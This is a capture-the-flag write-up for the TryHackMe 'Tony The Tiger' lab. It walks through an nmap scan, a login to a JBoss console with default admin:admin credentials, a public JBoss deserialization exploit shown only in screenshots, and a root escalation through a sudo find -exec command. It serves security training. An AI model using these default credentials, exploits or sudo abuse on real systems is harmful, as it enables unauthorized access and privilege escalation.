# TryHackMe-Tony The Tiger

## NMAP

```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-14 20:08 PKT                                                      
Nmap scan report for 10.10.127.87                                                                                    
Host is up (0.15s latency).                                                                                                                         
Not shown: 989 closed ports                                                                                          
PORT     STATE SERVICE     VERSION                                                                                   
22/tcp   open  ssh         OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)                           
| ssh-hostkey:                                                                                                       
|   1024 d6:97:8c:b9:74:d0:f3:9e:fe:f3:a5:ea:f8:a9:b5:7a (DSA)                                                       
|   2048 33:a4:7b:91:38:58:50:30:89:2d:e4:57:bb:07:bb:2f (RSA)                                                       
|   256 21:01:8b:37:f5:1e:2b:c5:57:f1:b0:42:b7:32:ab:ea (ECDSA)                                                      
|_  256 f6:36:07:3c:3b:3d:71:30:c4:cd:2a:13:00:b5:25:ae (ED25519)                                                    
80/tcp   open  http        Apache httpd 2.4.7 ((Ubuntu))                                                             
|_http-generator: Hugo 0.66.0                                                                                        
|_http-server-header: Apache/2.4.7 (Ubuntu)                                                                          
|_http-title: Tony&#39;s Blog                                                                                        
1090/tcp open  java-rmi    Java RMI                                                                                  
|_rmi-dumpregistry: ERROR: Script execution failed (use -d to debug)                                                 
1091/tcp open  java-rmi    Java RMI                                                                                                                 
1098/tcp open  java-rmi    Java RMI                                                                                  
1099/tcp open  java-object Java Object Serialization                                                                 
| fingerprint-strings:                                                                                                                              
|   NULL:                                                                                                                                           
|     java.rmi.MarshalledObject|                                                                                                                    
|     hash[                                                                                                                                         
|     locBytest                                                                                                                                     
|     objBytesq                                                                                                                                     
|     xpCCB                    
|     xpCCB                          
|     #http://thm-java-deserial.home:8083/q                               
|     org.jnp.server.NamingServer_Stub                                    
|     java.rmi.server.RemoteStub                                          
|     java.rmi.server.RemoteObject                                        
|     xpwA                           
|     UnicastRef2                    
|_    thm-java-deserial.home         
4446/tcp open  java-object Java Object Serialization                      
5500/tcp open  hotline?              
| fingerprint-strings:               
|   DNSStatusRequestTCP:             
|     GSSAPI                         
|     NTLM                           
|     CRAM-MD5                       
|     DIGEST-MD5                     
|     thm-java-deserial              
|   DNSVersionBindReqTCP, GenericLines, NULL:                             
|     CRAM-MD5                       
|     GSSAPI                         
|     NTLM                           
|     DIGEST-MD5                     
|     thm-java-deserial              
|   GetRequest:                      
|     DIGEST-MD5                     
|     CRAM-MD5                       
|     GSSAPI                         
|     NTLM                           
|     thm-java-deserial              
|   HTTPOptions:                     
|     DIGEST-MD5                     
|     GSSAPI                         
|     CRAM-MD5                       
|     NTLM          
|     thm-java-deserial              
|   Help:                            
|     NTLM                           
|     GSSAPI                         
|     DIGEST-MD5                     
|     CRAM-MD5                       
|     thm-java-deserial              
|   Kerberos:                        
|     CRAM-MD5                       
|     DIGEST-MD5                     
|     GSSAPI                         
|     NTLM                           
|     thm-java-deserial              
|   RPCCheck:                        
|     NTLM                           
|     DIGEST-MD5                     
|     CRAM-MD5                       
|     GSSAPI                         
|     thm-java-deserial              
|   RTSPRequest:                     
|     GSSAPI                         
|     NTLM                           
|     DIGEST-MD5                     
|     CRAM-MD5                       
|     thm-java-deserial              
|   SSLSessionReq:                   
|     GSSAPI                         
|     DIGEST-MD5                     
|     NTLM                           
|     CRAM-MD5                       
|     thm-java-deserial              
|   TLSSessionReq:                   
|     GSSAPI                         
|     DIGEST-MD5                     
|     NTLM                           
|     thm-java-deserial              
|   TerminalServerCookie:            
|     DIGEST-MD5                     
|     CRAM-MD5                       
|     NTLM                           
|     GSSAPI                         
|_    thm-java-deserial              
8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)                   
| ajp-methods:                       
|   Supported methods: GET HEAD POST PUT DELETE TRACE OPTIONS                                                                                       
|   Potentially risky methods: PUT DELETE TRACE                           
|_  See https://nmap.org/nsedoc/scripts/ajp-methods.html                  
8080/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1                                                                                      
| http-methods:                      
|_  Potentially risky methods: PUT DELETE TRACE                           
|_http-open-proxy: Proxy might be redirecting requests                    
|_http-server-header: Apache-Coyote/1.1                                   
|_http-title: Welcome to JBoss AS                                         
8083/tcp open  http        JBoss service httpd                            
|_http-title: Site doesn't have a title (text/html).                   
```
## PORT 80

<img src="https://imgur.com/TV4u49m.png"/>

We see an image so let's see if there is any stegongraphy involved in this

<img src="https://imgur.com/r7q42WH.png"/>

I tried to run `steghide` to extract something from the image but failed as there is something wrong with the bytes in the image

<img src="https://imgur.com/NeZlGLN.png"/>

Run `strings` on the image

<img src="https://imgur.com/7IUwqil.png"/>


Now download `jboss.zip` which is provided in the room



## PORT 8080

<img src="https://imgur.com/8HOa5VJ.png"/>

There is an `administrative console` and try to login with default credentials which are `admin`:`admin`

<img src="https://imgur.com/0JLEwU4.png"/>

<img src="https://imgur.com/ZAXM7JP.png"/>


<img src="https://imgur.com/hWrXG53.png"/>


Now search for the `jboss` exploit and on the github page you'll find it

<img src="https://imgur.com/eVgsIfx.png"/>

Run it like it does in the picture

<img src="https://imgur.com/8rS5aAp.png"/>

<img src="https://imgur.com/0MpKvKB.png"/>

Looking in `jboss` directory we'll find a password 

<img src="https://imgur.com/a5ydOew.png"/>

## Privilege Escalation

<img src="https://imgur.com/2ADqgUL.png"/>

We can see that we can run `find` as `sudo` so we can run find to execute a command to add `jboss` in sudoers

`jboss@thm-java-deserial:~$ sudo /usr/bin/find . -exec usermod -aG jboss \;`


```
jboss@thm-java-deserial:~$ sudo -l                                                                                                                  
Matching Defaults entries for jboss on thm-java-deserial:                                                                                           
    env_reset, mail_badpass,                                                                                                                        
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin                                                        
                                                                                                                                                    
User jboss may run the following commands on thm-java-deserial:                                                                                     
    (ALL) NOPASSWD: /usr/bin/find                                                                                                                   
    (ALL : ALL) ALL                                                                                                                                 
jboss@thm-java-deserial:~$ sudo bash                                                                                                                
[sudo] password for jboss:                                                                                                                          
root@thm-java-deserial:~#    
```
To get the root flag , it is in `base64` encoded

<img src="https://imgur.com/VRkOsqs.png"/>

Now let's use `hashcat` it is in `md5 raw` so we can crack it 
<img src="https://imgur.com/sCt8jzN.png"/>

<img src="https://imgur.com/78s7kFU.png"/>

